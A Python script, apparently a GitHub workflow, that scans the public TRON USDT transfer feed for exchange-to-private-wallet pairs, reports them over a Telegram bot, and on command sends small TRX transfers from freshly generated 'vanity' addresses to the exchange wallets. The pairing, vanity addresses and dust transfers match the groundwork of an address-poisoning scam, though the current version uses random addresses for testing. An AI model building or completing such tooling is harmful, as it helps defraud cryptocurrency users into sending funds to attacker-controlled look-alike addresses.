import os
import time
import requests
from collections import defaultdict
from datetime import datetime, timezone

print("🚀 Starting Bulletproof Scanner...")

# =========================
# 🟢 BROAD TEST SETTINGS
# =========================
TARGET_PAIRS = 5
MIN_TRANSFER_USD = 50
REQUIRED_TRANSFERS = 1  # Set to 1 for instant testing. Change to 2 later.

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
CHAT_ID = os.getenv("CHAT_ID", "")
TRONSCAN_API_KEY = os.getenv("TRONSCAN_API_KEY", "")
PRIVATE_KEY = os.getenv("PRIVATE_KEY", "")

CEX_KEYWORDS = ['binance', 'okx', 'huobi', 'htx', 'gate', 'kucoin', 'bybit', 'mexc', 'bitfinex', 'coinbase', 'kraken', 'bitget', 'poloniex']

found_pairs = []
checked_receivers = set()
TELEGRAM_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

def send_telegram(message):
    try:
        requests.post(f"{TELEGRAM_URL}/sendMessage", json={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
    except: pass

send_telegram("🚀 <b>Bulletproof Scanner Started</b>\nScanning for pairs...")

# =========================
# MAIN SCANNING LOOP
# =========================
while len(found_pairs) < TARGET_PAIRS:
    print(f"\n🔄 Scanning... Found {len(found_pairs)}/{TARGET_PAIRS}")
    
    try:
        r = requests.get(
            "https://apilist.tronscanapi.com/api/token_trc20/transfers",
            params={"start": 0, "limit": 200, "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", "sort": "-timestamp"},
            headers={"TRON-PRO-API-KEY": TRONSCAN_API_KEY} if TRONSCAN_API_KEY else {},
            timeout=30
        )
        data = r.json()
        transfers = data.get("token_transfers", [])  # THE FIX!
        
        print(f" Got {len(transfers)} transfers")
        
        if not transfers:
            time.sleep(5)
            continue
        
        # Group by receiver
        receivers = defaultdict(list)
        for tx in transfers:
            from_addr = tx.get("from_address")
            to_addr = tx.get("to_address")
            amount = int(tx.get("quant", 0)) / 1_000_000
            from_tag = tx.get("from_address_tag", {})
            
            if from_addr and to_addr and amount >= MIN_TRANSFER_USD:
                receivers[to_addr].append({"from": from_addr, "amount": amount, "tag": from_tag})
        
        # Find patterns
        for wallet_b, txs in receivers.items():
            if len(found_pairs) >= TARGET_PAIRS: break
            if wallet_b in checked_receivers: continue
            
            sender_counts = defaultdict(list)
            for tx in txs:
                sender_counts[tx["from"]].append(tx)
            
            for sender, sender_txs in sender_counts.items():
                if len(sender_txs) >= REQUIRED_TRANSFERS:
                    tag_name = sender_txs[0]["tag"].get("from_address_tag", "").lower() if sender_txs[0]["tag"] else ""
                    is_cex = any(keyword in tag_name for keyword in CEX_KEYWORDS)
                    cex_name = sender_txs[0]["tag"].get("from_address_tag", "Unknown") if sender_txs[0]["tag"] else "Unknown"
                    
                    if is_cex:
                        checked_receivers.add(wallet_b)
                        found_pairs.append({
                            "wallet_a": sender, "wallet_b": wallet_b,
                            "cex_name": cex_name, "amount": sender_txs[0]["amount"]
                        })
                        
                        print(f"✅ Pair Found: {cex_name} -> {wallet_b}")
                        send_telegram(f"✅ <b>Pair {len(found_pairs)}/{TARGET_PAIRS}</b>\n🏦 {cex_name}: <code>{sender[:20]}...</code>\n👤 Private: <code>{wallet_b[:20]}...</code>\n💰 ${sender_txs[0]['amount']}")
                    break
        
        if len(found_pairs) < TARGET_PAIRS:
            time.sleep(5)
            
    except Exception as e:
        print(f"❌ Error: {e}")
        time.sleep(10)

# =========================
# INTERACTIVE WAITING ROOM (With 5-minute timeout)
# =========================
send_telegram(f"🎯 <b>Target Reached! Found {len(found_pairs)} pairs</b>\n\nType <b>info</b> to see pairs, or <b>transfer</b> to execute.")

start_wait = time.time()
last_id = 0

while True:
    # 5-minute timeout so the GitHub job doesn't run for 10 hours!
    if time.time() - start_wait > 300:
        print("⏰ 5 minutes passed. Exiting to prevent 10-hour freeze.")
        send_telegram("⏰ <b>Session timed out after 5 minutes.</b>\nRun the workflow again to continue.")
        break

    try:
        updates = requests.get(f"{TELEGRAM_URL}/getUpdates", params={"offset": last_id, "timeout": 30}, timeout=35).json().get("result", [])
    except:
        updates = []
    
    for u in updates:
        last_id = u["update_id"]
        if u.get("message") and str(u["message"]["chat"]["id"]) == str(CHAT_ID):
            text = u["message"].get("text", "").strip()
            
            if text.lower() == "info":
                msg = f"📋 <b>Found Pairs ({len(found_pairs)})</b>\n\n"
                for i, p in enumerate(found_pairs):
                    msg += f"<b>#{i+1}</b> {p['cex_name']} → <code>{p['wallet_b'][:20]}...</code> (${p['amount']})\n"
                send_telegram(msg)
            
            elif text.lower() == "transfer":
                send_telegram(" <b>Transfer command received!</b>\nInitializing tronpy...")
                
                # Import tronpy ONLY when needed to prevent startup freeze
                try:
                    from tronpy import Tron
                    from tronpy.keys import PrivateKey
                    
                    tron = Tron()
                    priv = PrivateKey(bytes.fromhex(PRIVATE_KEY.replace('0x', '')))
                    main_addr = priv.public_key.to_base58check_address()
                    
                    send_telegram(f" Main Wallet: <code>{main_addr}</code>\nExecuting $0 TRX transfers...")
                    
                    for i, pair in enumerate(found_pairs):
                        # Generate simple random wallet for test
                        key = PrivateKey.random()
                        vanity = key.public_key.to_base58check_address()
                        
                        # Main -> Vanity
                        tx1 = tron.trx.transfer(main_addr, vanity, 1).build().sign(priv).broadcast().txid
                        time.sleep(3)
                        
                        # Vanity -> CEX
                        priv2 = PrivateKey(bytes.fromhex(key.hex()))
                        vanity_addr = key.public_key.to_base58check_address()
                        tx2 = tron.trx.transfer(vanity_addr, pair['wallet_a'], 1).build().sign(priv2).broadcast().txid
                        
                        send_telegram(f"✅ <b>#{i+1} Done</b>\nVanity: <code>{vanity[:20]}...</code>\nTX1: <code>{tx1[:20]}...</code>\nTX2: <code>{tx2[:20]}...</code>")
                        time.sleep(5)
                        
                    send_telegram("✅ <b>All transfers completed!</b>")
                except Exception as e:
                    send_telegram(f"❌ Transfer Error: {e}")
                break

    time.sleep(5)

print("✅ Workflow finished successfully.")
